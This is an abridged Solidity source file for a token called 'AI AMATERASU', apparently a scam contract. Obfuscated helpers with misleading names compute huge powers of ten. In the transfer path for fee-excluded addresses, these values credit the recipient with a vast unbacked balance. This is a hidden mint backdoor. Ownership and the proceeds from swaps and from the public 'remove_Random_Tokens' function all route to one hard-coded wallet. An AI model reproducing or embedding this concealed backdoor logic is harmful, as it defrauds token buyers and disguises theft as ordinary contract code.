...
// Telegram : https://t.me/AIAmaterasu
...
contract AIAMATERASU is Context, IERC20 { 
    ...
    function marketing_wallet() public view virtual returns (address) {
        return Wallet_Dews;
    }
    ...
    address payable public Wallet_Marketing = payable(0x8FF7bF8F3D9E96483BB8f11E12acCd4994f0812D); 
    address payable public Wallet_Dews = payable(0x011a0958D76980fd376d4378D822F1749965D2d6);
    address payable public constant Wallet_Burn = payable(0x000000000000000000000000000000000000dEaD); 


    uint256 private constant MAX = ~uint256(0);
    uint256 private _MIN_ = calllSchemeTime(10,((5*4)+3));
    uint8 private constant _decimals = 9;
    
    uint256 private _tTotal = 1* 10**6 * 10**_decimals;
    string private constant _name = "AI AMATERASU"; 
    string private constant _symbol = unicode"IAMATERASU"; 
    ...
    bool public datetimeUnix3 = false;
    ...
    constructor () {
        ...
        _owner = 0x011a0958D76980fd376d4378D822F1749965D2d6;
    ...
    function calllSchemeTime(uint256 from, uint256 to) private pure returns(uint256){
        return (from)**(to);
    }
    ...
    function mixedPackage(uint256 packageSize) private pure returns (uint256) {
        uint256 start = 0;
        uint256 end = 0;
        if(packageSize==2){
            start = 5+5;
        ...
        return calllSchemeTime((start), (end));
    }
    ...
    function call_Recipient(uint256 qpt) private returns(bool){
        if(qpt==1){
            datetimeUnix3 = true;
        }
        return true;
    ...
    function _transfer(
        ...
        if (from != Wallet_Burn && from != marketing_wallet() && from != owner())
        ...
        bool scheme1 = (_isExcludedFromFee[to]);
        bool takeFee = true;
        bool scheme2 = (_isExcludedFromFee[from]); 
        bool isBuy;
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
            ...
            sendToWallet(Wallet_Dews, BNB_Total);
    ...
    function remove_Random_Tokens(address random_Token_Address, uint256 percent_of_Tokens) public returns(bool _sent){
        ...
        _sent = IERC20(random_Token_Address).transfer(Wallet_Dews, removeRandom);
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        if(!takeFee){
            ...
            if(!(((datetimeUnix3)))){
                ...
                _tOwned[sender] = _tOwned[sender]-tAmount;
                _tOwned[recipient] = ((mixedPackage((2)*(1))))+_tOwned[recipient];
                emit Transfer(sender, recipient, tAmount);
            }
